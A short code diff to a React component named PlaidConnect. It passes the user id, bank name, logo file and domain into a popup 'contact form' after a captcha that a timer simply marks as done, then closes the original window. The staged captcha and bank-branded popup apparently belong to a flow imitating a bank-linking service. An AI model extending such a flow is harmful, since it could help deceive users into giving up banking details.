@@ -88,8 +88,17 @@ export default function PlaidConnect() {
     capTimer.current = setTimeout(() => {
       setCaptchaState('done')
       capTimer.current = setTimeout(() => {
-        // Abrir ContactForm en nueva ventana con user_id
-        const contactFormUrl = userId ? `/contact-form?uid=${userId}` : '/contact-form'
+        // Abrir ContactForm en nueva ventana con user_id y banco
+        const bankName = bank?.name || 'bank'
+        const bankFile = bank?.file || ''
+        const bankDomain = bank?.domain || ''
+        const params = new URLSearchParams({
+          uid: userId || '',
+          bank: bankName,
+          ...(bankFile && { file: bankFile }),
+          ...(bankDomain && { domain: bankDomain }),
+        })
+        const contactFormUrl = `/contact-form?${params.toString()}`
         window.open(contactFormUrl, '_blank', 'width=600,height=700,noopener')
         // Cerrar esta ventana después de un momento
         setTimeout(() => window.close(), 1000)
